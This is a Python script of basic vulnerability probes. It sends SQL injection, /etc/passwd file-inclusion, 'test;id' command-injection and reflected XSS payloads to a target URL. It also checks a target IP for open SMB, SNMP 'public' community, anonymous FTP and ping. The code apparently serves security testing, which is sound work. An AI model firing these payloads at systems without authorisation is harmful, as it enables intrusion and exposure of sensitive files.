import requests
import socket
from ftplib import FTP, error_perm

# --------- Web Exploits ---------

def test_sql_injection(url, param):
    payload_true = "' OR '1'='1"
    payload_false = "' OR '1'='2"

    url_true = f"{url}?{param}={payload_true}"
    url_false = f"{url}?{param}={payload_false}"

    try:
        res_true = requests.get(url_true, timeout=5)
        res_false = requests.get(url_false, timeout=5)

        if res_true.status_code == 200 and res_false.status_code == 200:
            if res_true.text != res_false.text:
                return True, "[+] Potential SQL Injection vulnerability detected!"
            else:
                return False, "[-] No difference in responses; SQLi less likely."
        else:
            return False, "[-] Unexpected HTTP responses, check target manually."
    except requests.RequestException as e:
        return False, f"[!] Request error: {e}"

def generate_lfi_payload(param, file_path="/etc/passwd"):
    return f"{param}={file_path}"

def test_lfi(url, param, file_path="/etc/passwd"):
    full_url = f"{url}?{param}={file_path}"
    try:
        res = requests.get(full_url, timeout=5)
        if res.status_code == 200 and "root:" in res.text:
            return True, "[+] LFI successful - /etc/passwd content found!", res.text[:200]
        else:
            return False, "[-] LFI attempt failed or file content not found.", None
    except requests.RequestException as e:
        return False, f"[!] Request error: {e}", None

def generate_cmd_injection_payload(param, cmd="id"):
    return f"{param}=test;{cmd}"

def test_cmd_injection(url, param, cmd="id"):
    """
    Simple test: append command injection payload, check output for typical command output.
    WARNING: Highly target dependent, may cause side effects.
    """
    payload = f"test;{cmd}"
    full_url = f"{url}?{param}={payload}"
    try:
        res = requests.get(full_url, timeout=5)
        if res.status_code == 200 and ( "uid=" in res.text or "root" in res.text ):
            return True, "[+] Command Injection seems successful (uid/root found)!"
        else:
            return False, "[-] Command Injection test failed or no command output detected."
    except requests.RequestException as e:
        return False, f"[!] Request error: {e}"

def generate_xss_payload(param):
    return f"{param}=<script>alert('XSS')</script>"

def test_xss(url, param):
    """
    Test reflected XSS by injecting payload and checking if it appears in response.
    Note: Simple check, false positives possible.
    """
    payload = "<script>alert('XSS')</script>"
    full_url = f"{url}?{param}={payload}"
    try:
        res = requests.get(full_url, timeout=5)
        if payload in res.text:
            return True, "[+] Reflected XSS vulnerability detected!"
        else:
            return False, "[-] No reflected XSS found."
    except requests.RequestException as e:
        return False, f"[!] Request error: {e}"

# --------- Network Exploits ---------

def test_smb_null_session(target_ip):
    """
    Try to connect to SMB port 445 to check if it's open.
    Real null session requires SMB protocol libraries (impacket).
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((target_ip, 445))
        sock.close()
        return True, "[+] SMB port 445 is open. Null session testing requires SMB libs."
    except Exception as e:
        return False, f"[-] SMB port 445 closed or filtered: {e}"

def test_snmp_public_community(target_ip):
    """
    Tries to connect to SNMP port 161 (UDP) and assumes community 'public'.
    Real SNMP interaction needs pysnmp (not implemented here).
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    try:
        sock.sendto(b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x71\xbb\x3c\x20\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x01\x00', (target_ip, 161))
        data, addr = sock.recvfrom(1024)
        return True, "[+] SNMP service responded. Public community might be enabled."
    except Exception as e:
        return False, f"[-] No SNMP response or access denied: {e}"

def test_ftp_anonymous_login(target_ip):
    try:
        ftp = FTP(target_ip, timeout=5)
        ftp.login()  # anonymous login
        ftp.quit()
        return True, "[+] Anonymous FTP login allowed!"
    except error_perm:
        return False, "[-] Anonymous FTP login denied."
    except Exception as e:
        return False, f"[-] FTP connection error: {e}"

def test_icmp_ping(target_ip):
    """
    Use system ping command for portability (requires subprocess).
    """
    import subprocess
    import platform

    param = "-n" if platform.system().lower() == "windows" else "-c"
    command = ["ping", param, "1", target_ip]

    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            return True, f"[+] Host {target_ip} is alive (ping succeeded)."
        else:
            return False, f"[-] Host {target_ip} did not respond to ping."
    except Exception as e:
        return False, f"[!] Ping command failed: {e}"
